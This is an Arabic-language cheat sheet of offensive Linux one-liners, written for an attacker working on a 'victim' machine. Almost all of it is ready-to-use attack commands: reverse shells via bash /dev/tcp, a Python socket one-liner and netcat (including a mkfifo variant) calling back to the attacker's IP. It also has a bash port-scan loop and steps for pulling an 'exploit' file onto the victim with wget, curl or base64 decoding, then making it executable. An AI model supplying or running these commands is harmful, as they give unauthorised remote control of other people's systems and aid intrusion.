# أوامر وسكريبتات السطر الواحد الهجومية (Offensive Linux One-Liners)

تجميعة من أهم وأسرع الأوامر اللي بنحتاجها في العمليات الهجومية زي فتح الـ Reverse Shells، وفحص البورتات السريع، ونقل الملفات بين الأجهزة.

---

## 1. أوامر الـ Reverse Shell السريعة

قبل ما تشغل أي أمر من دول على جهاز الضحية، لازم تشغل برنامج الاستماع عندك على جهازك الأول:
```bash
nc -nvlp 4444
```

### أمر Bash مباشر
```bash
bash -i >& /dev/tcp/IP_جهازك/4444 0>&1
```

### أمر Python3
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_جهازك",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### أمر Netcat
```bash
nc -e /bin/bash IP_جهازك 4444

# أو بالطريقة الثانية لو خيار e- مقفول في Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP_جهازك 4444 >/tmp/f
```

---

## 2. فحص البورتات المفتوحة من غير Nmap

لو أنت جوه جهاز ومفيش عليه أداة Nmap، تقدر تعمل فحص سريع للبورتات المفتوحة باستخدام سكريبت Bash في سطر واحد:

```bash
for port in {1..1024}; do (echo >/dev/tcp/192.168.1.1/$port) >/dev/null 2>&1 && echo "Port $port is OPEN"; done
```

---

## 3. طرق نقل الملفات بين الأجهزة (File Transfer)

### تشغيل سيرفر ويب سريع عندك لتوزيع الملفات (Sender)
```bash
python3 -m http.server 8000
```

### تحميل الملف على جهاز الضحية (Receiver)
```bash
wget http://IP_جهازك:8000/exploit
# أو
curl -O http://IP_جهازك:8000/exploit
```

### نقل الملفات المشفّرة بـ Base64 (في حالة وجود قيود على الشبكة)
على جهازك الهجومي (تشفير الملف):
```bash
base64 -w 0 exploit.sh
```

على جهاز الضحية (فك التشفير وتشغيل السكربت):
```bash
echo "حط_هنا_نص_البايس64" | base64 -d > exploit.sh && chmod +x exploit.sh
```
